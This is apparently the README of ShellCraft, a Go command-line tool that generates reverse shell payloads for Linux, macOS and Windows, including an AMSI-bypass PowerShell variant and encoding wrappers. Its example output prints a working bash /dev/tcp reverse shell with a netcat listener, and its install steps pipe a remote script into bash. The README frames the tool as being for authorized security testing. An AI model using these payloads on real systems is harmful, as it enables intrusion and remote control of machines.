# ShellCraft

[![Go Version](https://img.shields.io/github/go-mod/go-version/MKMithun2806/ShellCraft)](https://go.dev/)
[![License](https://img.shields.io/github/license/MKMithun2806/ShellCraft)](LICENSE)
[![Latest Release](https://img.shields.io/github/v/release/MKMithun2806/ShellCraft)](https://github.com/MKMithun2806/ShellCraft/releases)

ShellCraft is a standalone, interactive CLI tool written in Go for generating local reverse shell payloads. It is designed for cybersecurity professionals and enthusiasts to quickly generate common and obfuscated payloads using only the Go standard library.

## Features

- **Interactive Workflow:** Guides you through inputting the attacker IP and port.
- **Clipboard Support:** Copy generated payloads directly to your clipboard with one click.
- **Multiple Payloads:**
  - **Linux Bash:** Standard bash reverse shell.
  - **Linux/macOS NC FIFO:** Netcat-based shell using a named pipe.
  - **Windows PowerShell (AMSI Bypass):** A fragmented PowerShell payload to bypass basic static signature scanning.
  - **macOS Zsh Native:** Native Zsh reverse shell using `ztcp`.
- **Encoding & Wrappers:**
  - **Raw:** Plaintext payload.
  - **URL Encoded:** For web-based delivery.
  - **Base64/Pipeline:** Wrapped in `echo | base64 -d | sh`.
- **Zero External Dependencies:** Built entirely with the Go standard library.
- **Clean Exit:** Gracefully handles `Ctrl+C`.

## Installation

Ensure you have Go installed on your system.

### Option 1: Quick Install (via script)

Run the following command to download and run the installer:
```bash
curl -sSL https://raw.githubusercontent.com/MKMithun2806/ShellCraft/main/install.sh | bash
```

### Option 2: Using go install

```bash
go install github.com/MKMithun2806/ShellCraft/src@latest
```

### Option 3: Manual Build

1. Clone the repository:
   ```bash
   git clone https://github.com/MKMithun2806/ShellCraft.git
   cd ShellCraft
   ```
2. Build the binary:
   ```bash
   go build -ldflags "-X main.Version=1.0.0" -o shellcraft src/*.go
   ```

## Usage

Run the tool:
```bash
shellcraft
```

### Example

1. **Input IP:** `10.10.10.10`
2. **Input Port:** `4444`
3. **Select Payload:** `Linux Bash`
4. **Select Wrapper:** `Raw`

**Expected Output:**
```text
============================================================
[+] Listener Command:
    nc -lvnp 4444

[+] Finalized Payload (Linux Bash - Raw):

bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

============================================================
```

## Uninstallation

To remove ShellCraft:
```bash
curl -sSL https://raw.githubusercontent.com/MKMithun2806/ShellCraft/main/uninstall.sh | bash
```

## Disclaimer

This tool is intended for legal, authorized security testing and educational purposes only. Do not use it for malicious activities.
